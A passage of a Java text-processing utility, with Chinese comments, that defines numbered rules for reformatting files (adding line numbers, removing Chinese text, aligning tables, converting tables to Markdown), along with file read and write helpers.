				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class BoardCopy_ToLeft_Rule_12 extends Basic_Rule {

		BoardCopy_ToLeft_Rule_12(boolean mIsInputDirAsSearchPoint) {
			super(12);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		BoardCopy_ToLeft_Rule_12() {
			super(12, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				ArrayList<String> fixedStrArr = BoardCopyStrToLeft_Rule_12(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " -> 把 剪切板的字符串 逐行 复制 到当前 文本的 逐行 后边   A6   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把 剪切板的字符串 逐行 复制 到当前 文本的 逐行 后边  (A6)";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	// getMDtable_ForCommonText_Rule_11

	class Table_MDStyle_Rule_11 extends Basic_Rule {

		Table_MDStyle_Rule_11(boolean mIsInputDirAsSearchPoint) {
			super(11);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		Table_MDStyle_Rule_11() {
			super(11, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				ArrayList<String> fixedStrArr = getMDtable_ForCommonText_Rule_11(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " -> 把表格 2x2 3x3 4x4  ... 转为   MD文件格式 加入 |---| 分割符号  File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把表格 2x2 3x3 4x4  ... 转为   MD文件格式 加入 |---| 分割符号 (A5)";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	// 往 每行的加入占位符 开头加入 【ZHead】 结尾加入【ZTail】 方便替换
	class Add_BeginStr_EndStr_Rule_10 extends Basic_Rule {

		String beginStr;
		String endStr;

		Add_BeginStr_EndStr_Rule_10(boolean mIsInputDirAsSearchPoint) {
			super(10);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
			beginStr = "【ZHead】";
			endStr = "【ZTail】";
		}

		Add_BeginStr_EndStr_Rule_10() {
			super(10, false);
			beginStr = "【ZHead】";
			endStr = "【ZTail】";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedStrArr = addZhanWeiFlag_Rule_10(contentList, beginStr, endStr);
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " -> 往 每行的加入占位符   开头加入 【ZHead】   结尾加入【ZTail】 方便替换  File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 往 每行的加入占位符   开头加入 【ZHead】   结尾加入【ZTail】 方便替换 (A4) ";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	// ShuZhuangHang_PaiLie_Rule_6

	class PaiLie_5x5_Rule_9 extends PaiLie_2x2_Rule_6 {
		PaiLie_5x5_Rule_9() {
			super(9);
			Rule6_num_row = 5;
			rowSize = 5;
		}
	}

	class PaiLie_4x4_Rule_8 extends PaiLie_2x2_Rule_6 {
		PaiLie_4x4_Rule_8() {
			super(8);
			Rule6_num_row = 4;
			rowSize = 4;
		}
	}

	class PaiLie_3x3_Rule_7 extends PaiLie_2x2_Rule_6 {
		PaiLie_3x3_Rule_7() {
			super(7);
			Rule6_num_row = 3;
			rowSize = 3;
		}
	}

	class PaiLie_2x2_Rule_6 extends Basic_Rule {
		int rowSize = 0;

		PaiLie_2x2_Rule_6(boolean mIsInputDirAsSearchPoint) {
			super(6);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
			Rule6_num_row = 2;
			rowSize = Rule6_num_row;
		}

		PaiLie_2x2_Rule_6(int ruleIndex) {
			super(ruleIndex, false);
			Rule6_num_row = 2;
			rowSize = Rule6_num_row;
		}

		PaiLie_2x2_Rule_6() {
			super(6, false);
			Rule6_num_row = 2;
			rowSize = Rule6_num_row;
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			Rule6_num_row = rowSize;
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String> contentList = calcul_duiqi_Rule_5(fileItem,I9_Temp_Text_File);
				ArrayList<String> fixedStrArr = ShuZhuangHang_PaiLie_Rule_6(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " -> 把当前顺序排列的数据 转为每行" + rowSize + "个的排序方式  File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把当前顺序排列的数据 转为每行" + rowSize + "个的排序方式 (A3)";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class Duiqi_Hang_Rule_5 extends Basic_Rule {

		Duiqi_Hang_Rule_5(boolean mIsInputDirAsSearchPoint) {
			super(5);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		Duiqi_Hang_Rule_5() {
			super(5, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String> contentList = calcul_duiqi_Rule_5(fileItem,I9_Temp_Text_File);
				ArrayList<String> fixedStrArr = duiqi_Rule_5(fileItem, I9_Temp_Text_File);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_5 -> 把当前 表格数据 行对齐( 每行 数值项个数相等)  File=" + fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把当前 表格数据 行对齐( 需要每行 数值项个数相等) (A2)";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class ClearChinese_Rule_4 extends Basic_Rule {

		ClearChinese_Rule_4(boolean mIsInputDirAsSearchPoint) {
			super(4);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		ClearChinese_Rule_4() {
			super(4, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedStrArr = clearChinese_Rule_4(contentList);
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_4 -> 把当前文件的中文去除  File=" + fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把当前文件的中文去除";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class AddLineNumberChar_Rule_3 extends Basic_Rule {

		AddLineNumberChar_Rule_3(boolean mIsInputDirAsSearchPoint) {
			super(3);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		AddLineNumberChar_Rule_3() {
			super(3, false);

		}

		// 1. 完成参数的 自我客制化 实现 checkParamsOK 方法

		// 2. 对应的逻辑方法 实现方法 applyOperationRule

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedStrArr = addLineNumberChar_Rule_3(contentList);
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_3 -> 把当前文件加入行号  File=" + fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把当前文件加入行号 (A1)";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class OnlyGetFirstStr_AsOneLine_Rule_2 extends Basic_Rule {

		OnlyGetFirstStr_AsOneLine_Rule_2(boolean mIsInputDirAsSearchPoint) {
			super(2);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		OnlyGetFirstStr_AsOneLine_Rule_2() {
			super(2, false);

		}

		// 1. 完成参数的 自我客制化 实现 checkParamsOK 方法

		// 2. 对应的逻辑方法 实现方法 applyOperationRule

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedStrArr = clearOneBlankCharAsOneStr_Rule_2(contentList);
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println(
						"rule_2 -> 把当前文件内容的每行的第一个空格之后的字符串组成一个字符串 中间《等号=分割》 File=" + fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return "把当前文件内容的每行的第一个空格之后的字符串组成一个字符串 《中间等号=分割》 《等号=分割》";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	// 只获取 每一行的第一个空格前的字符串 其余字符串 删除
	class OnlyGetFirstStr_InOneLine_Rule_1 extends Basic_Rule {

		OnlyGetFirstStr_InOneLine_Rule_1(boolean mIsInputDirAsSearchPoint) {
			super(1);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		OnlyGetFirstStr_InOneLine_Rule_1() {
			super(1, false);

		}

		// 1. 完成参数的 自我客制化 实现 checkParamsOK 方法

		// 2. 对应的逻辑方法 实现方法 applyOperationRule

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedStrArr = clearOneBlankChar_Rule_1(contentList);
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_1 -> 把当前文件内容的每行的第一个空格之后的字符串删除！ File=" + fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:"
						+ " 只获取 每一行的第一个空格前的字符串 其余字符串 删除";
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:"
						+ " 只获取 每一行的第一个空格前的字符串 其余字符串 删除";
			}

			return itemDesc;
		}

		@Override
		String simpleDesc() {
			return "只获取 每一行的第一个空格前的字符串 其余字符串 删除";
		}

	}

	class Basic_Rule extends Rule {




		void init_pre_params( ArrayList<String> preParamList) {

		}


		Basic_Rule(String ctype, int cindex, int opera_type) {
			this.file_type = ctype;
			this.rule_index = cindex;
			this.identify = this.file_type + "" + this.rule_index;
			curFilterFileTypeList = new ArrayList<String>();
			curFixedFileList = new ArrayList<File>();
			needAllFileFlag = true;
			curInputFileList = new ArrayList<File>();
			if (First_Input_RealFile != null) {
				curInputFileList.add(First_Input_RealFile);
			}
		}

		Basic_Rule(int ruleIndex) {
			this.rule_index = ruleIndex;
			this.file_type = "*"; // 文件的处理类型 默认是 *
			this.identify = this.file_type + "" + this.rule_index;
			curFilterFileTypeList = new ArrayList<String>();
			curFixedFileList = new ArrayList<File>();
			errorMsg = "";
			needAllFileFlag = true;
			curInputFileList = new ArrayList<File>();
			if (First_Input_RealFile != null) {
				curInputFileList.add(First_Input_RealFile);
			}
		}

		Basic_Rule(int ruleIndex, boolean mNeedAllFile) {
			this.rule_index = ruleIndex;
			this.file_type = "*"; // 文件的处理类型 默认是 *
			this.identify = this.file_type + "" + this.rule_index;
			curFilterFileTypeList = new ArrayList<String>();
			curFixedFileList = new ArrayList<File>();
			errorMsg = "";
			needAllFileFlag = mNeedAllFile;
			curInputFileList = new ArrayList<File>();
			if (First_Input_RealFile != null) {
				curInputFileList.add(First_Input_RealFile);
			}
		}

		@Override
		void operationRule(ArrayList<String> inputParamsList) {

			ArrayList<File> shellFileList = new ArrayList<File>();
			ArrayList<File> subDirList = new ArrayList<File>();
			ArrayList<File> realFileList = new ArrayList<File>();
			ArrayList<File> allFileList = new ArrayList<File>();
			// 当前 shell 目录下的所有文件
			shellFileList.addAll(Arrays.asList(CUR_Dir_FILE.listFiles()));
			if (needAllFileFlag) {
				if (isInputDirAsSearchPoint && inputDirFile != null) {
					allFileList = getAllSubFile(inputDirFile, null, null);
					initFileTypeMap(allFileList);
				} else {
					allFileList = getAllSubFile(CUR_Dir_FILE, null, null);
					initFileTypeMap(allFileList);
				}

			}

			for (int j = 0; j < allFileList.size(); j++) {
				File curFile = allFileList.get(j);
				if (curFile.isDirectory()) {
					subDirList.add(curFile);
				} else {
					realFileList.add(curFile);
				}
			}
			applyOperationRule(shellFileList, CUR_Dir_FILETypeMap, subDirList, realFileList);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			return null;
		}

		String simpleDesc() {
			return null;
		}

		@Override
		boolean checkParamsOK(File shellDir, String type2Param, ArrayList<String> otherParams) {

			if (otherParams == null || otherParams.size() == 0) {
				errorMsg = "用户输入的文件参数为空";
				return false;
			}

			for (int i = 0; i < otherParams.size(); i++) {
				String pre = "." + File.separator;
				String curStringItem = otherParams.get(i).toString();
				String curAbsPath = "";
				if (curStringItem.startsWith(pre)) {
					curStringItem = curStringItem.substring(2);
				}
				curAbsPath = shellDir.getAbsolutePath() + File.separator + curStringItem;
				File curFIle = new File(curAbsPath);
				if (curFIle.exists() && !curInputFileList.contains(curFIle)) {
					if (First_Input_RealFile != null
							&& First_Input_RealFile.getAbsolutePath().equals(curFIle.getAbsolutePath())) {
						continue;
					} else {
						curInputFileList.add(curFIle);
					}

					System.out.println("curFIle = " + curFIle.getAbsolutePath() + " TIme = " + getTimeStamp());
				}
			}
			return true; // 默认返回通过 不检查参数 如果有检查的需求 那么就实现它
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}

		boolean tryReName(File curFile, String newName) {
			String newFilePath = curFile.getParent() + File.separator + newName;
			String oldName = curFile.getName();
			File newFile = new File(newFilePath);
			if (newFile.exists() && newFilePath.equals(curFile.getAbsolutePath())) {

//           newFilePath = curFile.getParent() + File.separator +"重复_"+newName;
//           newFile = new File(newFilePath);
				System.out.println("当前目录已存在重命名后的文件  文件名称:" + curFile.getName());
				return false; // 已经存在的文件不处理 直接返回

			}
			boolean flag = curFile.renameTo(newFile);
			if (flag) {
				System.out.println(oldName + " 转为 " + newFilePath + " 成功！");
				curFixedFileList.add(curFile);
			} else {
				System.out.println(oldName + " 转为 " + newFilePath + " 失败！");
			}
			return flag;
		}
	}

	abstract class Rule {
		ArrayList<File> curInputFileList;
		int rule_index; // rule_index 组成了最基础的唯一键 rule_index 就是唯一的序号 1 2 3 4 5 6 7

		// operation_type 操作类型 1--读取文件内容字符串 进行修改 2--对文件对文件内容(字节)--进行修改 3.对全体子文件进行的随性的操作
		// 属性进行修改(文件名称)
		// 4.对当前子文件(包括子目录 子文件 --不包含孙目录 孙文件) // 5. 从shell 中获取到的路径 去对某一个文件进行操作

		Rule() {
			inputDirFile = First_Input_Dir;
			if (inputDirFile == null) {
				isInputDirAsSearchPoint = false;
			}
		}

		String file_type; // * 标识所有的文件类型 以及当前操作类型文件 或者 单独的文件过滤类型
		String identify;
		String errorMsg;
		boolean needAllFileFlag;

		File inputDirFile; // 操作文件 目录

		boolean isInputDirAsSearchPoint; // 是否以 输入的 文件夹作为 全局搜索的 起点

		ArrayList<String> curFilterFileTypeList; // 当前的文件过滤类型 多种文件过滤类型 例如把 多种格式 jpeg png 转为 jpg 时 使用到
		ArrayList<File> curFixedFileList; // 当前修改操作成功的集合
		ArrayList<File> inputFileList; // 从输入参数得到的文件的集合

		abstract void operationRule(ArrayList<String> inputParamsList);

		// abstract String applyStringOperationRule1(String origin); // 不要这样的方法了 只保留
		// 最有用的 那个 applyOperationRule
//        abstract    File applyFileByteOperationRule2(File originFile);
//        abstract    ArrayList<File> applyFileListRule3(ArrayList<File> subFileList , HashMap<String, ArrayList<File>> fileTypeMap);
		// applyFileListRule4
		abstract ArrayList<File> applyOperationRule(ArrayList<File> curFileList,
													HashMap<String, ArrayList<File>> subFileTypeMap, ArrayList<File> curDirList,
													ArrayList<File> curRealFileList);

		// abstract void initParams4InputParam(String inputParam); // 初始化Rule的参数
		// 依据输入的字符串
		abstract String ruleTip(String type, int index, String batName, OS_TYPE curType); // 使用说明列表 如果覆盖 那么就不使用默认的说明 ,
		// 默认就一种情况

		abstract String simpleDesc(); // 使用的简单描述 中文的该 rule的使用情况 默认会在 ruleTip 被调用

		abstract boolean checkParamsOK(File shellDir, String type2Param, ArrayList<String> otherParams);


		abstract void init_pre_params( ArrayList<String> preParamList);

		abstract void showWrongMessage();
	}

	static void writeContentToFile(File file, String strParam) {

		try {
			if (file != null && !file.exists()) {
				file.createNewFile();
			}

			if (file != null && file.exists()) {
				BufferedWriter curBW = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "utf-8"));
				curBW.write(strParam);
				curBW.flush();
				curBW.close();
				// System.out.println("write out File OK ! File = " + file.getAbsolutePath());
			} else {
				System.out.println("write out File  Failed !    File = " + file.getAbsolutePath());
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static ArrayList<String> ReadFileContentAsList(File mFilePath) {

		if (mFilePath != null && mFilePath.exists()) {
			// System.out.println("存在 当前文件 "+ mFilePath.getAbsolutePath());
		} else {
			System.out.println("不存在 当前文件 " + mFilePath.getAbsolutePath());

			return null;
		}
		ArrayList<String> contentList = new ArrayList<String>();

		try {
			BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(mFilePath), "utf-8"));
			String oldOneLine = "";
			int index = 1;
			while (oldOneLine != null) {

				oldOneLine = curBR.readLine();
				if (oldOneLine == null) {
					continue;
				}

				contentList.add(oldOneLine);
//                    System.out.println("第"+index+"行读取到的字符串:"+oldOneLine);
				index++;

			}
			curBR.close();

		} catch (Exception e) {
			e.printStackTrace();
		}
		return contentList;

	}

	public static String ReadFileContent(File mFilePath) {

		if (mFilePath != null && mFilePath.exists()) {
			// System.out.println("存在 当前文件 "+ mFilePath.getAbsolutePath());
		} else {
			System.out.println("不存在 当前文件 " + mFilePath.getAbsolutePath());

			return null;
		}
		StringBuilder sb = new StringBuilder();

		try {
			BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(mFilePath), "utf-8"));
			String oldOneLine = "";
			int index = 1;
			while (oldOneLine != null) {

				oldOneLine = curBR.readLine();
				if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
					continue;
				}

				sb.append(oldOneLine + "\n");
//                    System.out.println("第"+index+"行读取到的字符串:"+oldOneLine);
				index++;

			}
			curBR.close();

		} catch (Exception e) {
			e.printStackTrace();
		}
		return sb.toString();

	}

	public static boolean isContainChinese(String str) {
		Pattern p = Pattern.compile("[\u4e00-\u9fa5]");
		Matcher m = p.matcher(str);
		if (m.find()) {
			return true;
		}
		return false;
	}

	static byte[] listTobyte(List<Byte> list) {

		byte[] bytes = Bytes.toArray(list);

		return bytes;
	}

	static void writeByteArrToFile(File file, ArrayList<Byte> byteList) {
		try {

			byte[] byteArr = listTobyte(byteList);
			InputStream is = new ByteArrayInputStream(byteArr);

			if (file != null && !file.exists()) {
				file.createNewFile();
			}

			if (file != null && file.exists()) {

				byte[] buff = new byte[1024];
				int len = 0;

				OutputStream curBW = new FileOutputStream(file);
